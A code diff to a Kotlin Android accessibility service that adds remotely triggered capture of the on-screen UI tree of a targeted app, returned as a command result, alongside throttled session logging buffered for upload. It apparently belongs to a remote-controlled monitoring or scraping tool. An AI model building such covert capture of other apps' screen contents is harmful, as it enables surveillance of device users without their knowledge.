@@ -37,6 +37,8 @@ class MyAccessibilityService : AccessibilityService() {
     // TREE SCRAPER STATE
     private var treeDumpEndTime = 0L
     private var targetDumpPkg: String? = null
+    var pendingTreeCommandId: Int = -1
+    var pendingTreeDepth: Int = 10
     
     // PHOENIX STATE
     private var lastPhoenixCheck = 0L
@@ -125,20 +127,37 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         // --- 1.5 TREE SCRAPER ENGINE (Session-Based) ---
-        if (now < treeDumpEndTime) {
-            // Throttle: Only capture UI state every 2 seconds during a session to save resources
-            if (now - lastScreenRead > 2000) {
-                if (targetDumpPkg == null || targetDumpPkg == pkgName) {
-                    val root = rootInActiveWindow
-                    if (root != null) {
+        if (now < treeDumpEndTime || pendingTreeCommandId != -1) {
+            if (targetDumpPkg == null || targetDumpPkg == pkgName) {
+                val root = rootInActiveWindow
+                if (root != null) {
+                    // 1. Check for Pending Database Command
+                    if (pendingTreeCommandId != -1 && (targetDumpPkg == null || targetDumpPkg == pkgName)) {
+                        val cmdId = pendingTreeCommandId
+                        val depth = pendingTreeDepth
+                        pendingTreeCommandId = -1 // Clear instantly to prevent double-fire
+                        
+                        val treeData = serializeNode(root, 0, depth)
+                        val result = JSONObject().apply {
+                            put("depth_limit", depth)
+                            put("snapshot", treeData)
+                        }
+                        
+                        CoroutineScope(Dispatchers.IO).launch {
+                            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "SCAN_COMPLETE", null, result, null)
+                            DebugLogger.log("SCRAPER", "Lazy capture complete for Command [$cmdId]")
+                        }
+                    }
+
+                    // 2. Standard Session Logging (Throttled)
+                    if (now < treeDumpEndTime && now - lastScreenRead > 2000) {
                         val treeJson = serializeNode(root, 0, 10)
                         val wrapper = JSONObject()
                         wrapper.put("pkg", pkgName)
                         wrapper.put("ts", now)
                         wrapper.put("tree", treeJson)
                         DumpManager.appendLog("TREE", wrapper)
-                        DebugLogger.log("SCRAPER", "UI Tree capture complete for [$pkgName]. Buffered for upload.")
-                        lastScreenRead = now // Update throttle
+                        lastScreenRead = now
                     }
                 }
             }
